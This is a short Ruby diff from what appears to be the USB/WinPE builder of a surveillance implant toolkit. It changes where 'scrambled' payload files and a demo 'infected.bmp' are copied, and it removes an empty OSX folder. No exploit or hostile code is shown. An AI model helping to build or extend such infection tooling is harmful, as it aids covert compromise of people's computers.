@@ -36,12 +36,17 @@ class BuildUSB < Build
 
     # copy the scrambled files in our directories
     build.scrambled.keep_if {|k, v| k != :dir and k != :reg}.each_pair do |k, v|
-      FileUtils.mkdir_p(path("winpe/RCSPE/files/#{platform.upcase}"))
-      FileUtils.cp(File.join(build.tmpdir, v), path("winpe/RCSPE/files/#{platform.upcase}/" + v))
-      @outputs << "winpe/RCSPE/files/#{platform.upcase}/" + v
+      FileUtils.mkdir_p(path("winpe/RCSPE/files/WINDOWS"))
+      FileUtils.cp(File.join(build.tmpdir, v), path("winpe/RCSPE/files/WINDOWS/" + v))
+      @outputs << "winpe/RCSPE/files/WINDOWS/" + v
     end
 
-    FileUtils.cp(File.join(build.tmpdir, 'demo_image'), path("winpe/RCSPE/files/#{platform.upcase}/infected.bmp")) if params['demo']
+    FileUtils.cp(File.join(build.tmpdir, 'demo_image'), path("winpe/RCSPE/files/WINDOWS/infected.bmp")) if params['demo']
+
+    # if mac was not built, delete it to avoid errors during installation without osx
+    if Dir[path("winpe/RCSPE/files/OSX/*")].size == 1
+      FileUtils.rm_rf(path("winpe/RCSPE/files/OSX"))
+    end
 
     build.clean
 
